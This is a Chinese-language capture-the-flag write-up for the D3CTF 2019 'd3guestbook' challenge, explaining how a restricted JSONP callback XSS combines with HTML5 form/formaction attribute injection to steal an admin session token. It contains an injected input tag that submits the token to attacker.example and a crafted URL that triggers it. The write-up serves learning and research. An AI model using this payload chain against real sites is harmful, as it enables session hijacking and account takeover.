# d3guestbook

## 题目简述

题目是在线留言板，留言内容允许插入部分 HTML，但通过标签名和属性名白名单过滤危险输入。前端源码暴露两个关键点：CSRF token 直接等同于 sessionid，且路由参数 `did` 被拼接进 JSONP 请求 URL。单独的 JSONP callback 受字符集限制不能任意执行 JavaScript，但可以与可插入 HTML 的留言结合，利用 `form`/`formaction` 属性劫持页面里的提交表单，把管理员 token 提交到攻击者服务器，再用 token 登录管理员账号读取 flag。

题目资料地址：https://github.com/f1shh/My-CTF-Challenges/tree/master/D3CTF2019

题目附件包含 `source/front`、`source/backend`、`source/bot.py` 和数据库 SQL。后端 `index.js` 中 session 名为 `sessid`，cookie 设置 `httpOnly: false`；CSRF 检查直接接受 `req.cookies.sessid == token`，或者 Referer 主机以 `.d3guestbook.d3ctf.io` 结尾。`/api/post/:id/delete` 使用 `res.jsonp()` 返回，`/api/report` 只允许本站域名并带 6 位 MD5 前缀验证码。这些源码细节支撑了“拿 session token + JSONP callback + HTML5 表单劫持”的组合利用。

## 解题过程

题目是一个在线留言板，注册登录后可以提交留言。

简单测试后会发现留言可以插入 HTML 标签，但是后端使用了标签名/属性名白名单做过滤，一般的危险标签和属性都被 ban 掉了。

控制台可以看到打包前的前端源码，审计一波。

第一个问题，CSRF token 是直接使用的 sessionid

前端源码中 `token` 字段直接取自 `document.cookie.substring(7)`，也就是 cookie 里的 `sessid`：

```js
data() {
    return {
        name: 'Login',
        form: {
            message: '',
            token: document.cookie.substring(7),
        },
    };
}
```

因此如果我们能获得他人的 token 就可以登录他人账号。

第二个问题，我们传入的参数 this.$route.query.did 被拼接到了 jsonp 方法的 url 当中

```js
this.$http.jsonp(
    '/api/post/' + this.$route.query.did + '/delete',
    { jsonp: 'callback' },
);
```

因此我们可以设置 did 为 `1/delete?callback=alert#` ，控制 jsonp 的 callback ，在 jsonp 方法中会直接执行：

```text
alert([object Object])
```

但是后端的 jsonp api 给 callback 做了校验，只能传入有限的字符，并不能任意执行 js 代码。

后端响应里可以看到 callback 参数只允许受限字符集，不能直接拼出完整 JavaScript payload。

所以我们需要把这两个问题结合利用一下，利用这个受限的 jsonp xss 来劫持 token

页面中 token 被渲染到了 `id="messageForm"` 的表单里：

```html
<form data-v-... class="el-form" id="messageForm">
    <input type="hidden" autocomplete="off" name="token" class="el-input__inner" value="...">
</form>
```

我们可以看到 token 被渲染到了 id 为 messageForm 的 form 中，所以我们可以尝试劫持这个 form ，让他的 submit 后提交到我们的服务器，从而获取 token 。

如何劫持呢？利用两个 HTML5 表单属性：`form` 可以让表单外的控件通过表单 `id` 绑定到页面中已有的 `<form>`，`formaction` 可以覆盖该控件触发表单提交时的目标地址。因此只要留言白名单允许相关属性，就能把页面原有提交行为改成向攻击者服务器发送 token。

> [https://www.w3school.com.cn/tags/att\_input\_formaction.asp](https://www.w3school.com.cn/tags/att_input_formaction.asp)  
> [https://www.w3school.com.cn/tags/att\_input\_form.asp](https://www.w3school.com.cn/tags/att_input_form.asp)

我们可以利用留言功能插入一个在表单之外的 input 标签，再利用这两个属性来劫持表单：

```html
<input form="messageForm" formaction="https://attacker.example/collect" id="fish">
```

利用 jsonp xss 来点击它：

```bash
LOCAL_FRONTEND/#/?pid=72&did=23%2Fdelete%3Fcallback%3Dfish.click%23
```

token 就到手了：

```text
GET /?token=<admin-session-token> HTTP/1.1
```

report 这条 payload ，获得 admin 的 token 之后登录 admin 账号，在 admin 的留言中获得 flag 。

## 方法总结

- 核心技巧：受限 JSONP XSS 可与 HTML 表单劫持组合使用，不必直接执行任意 JavaScript，也能诱导目标点击或提交泄露 token。
- 识别信号：CSRF token 等于 sessionid、Vue 路由参数进入 JSONP URL、留言可插入白名单 HTML 时，应检查 callback 可控性和 HTML5 表单属性。
- 复用要点：`form` 属性可以让表单外的控件绑定到目标表单，`formaction` 可以覆盖提交地址；过滤器只看标签和属性白名单时，容易漏掉这类组合利用。
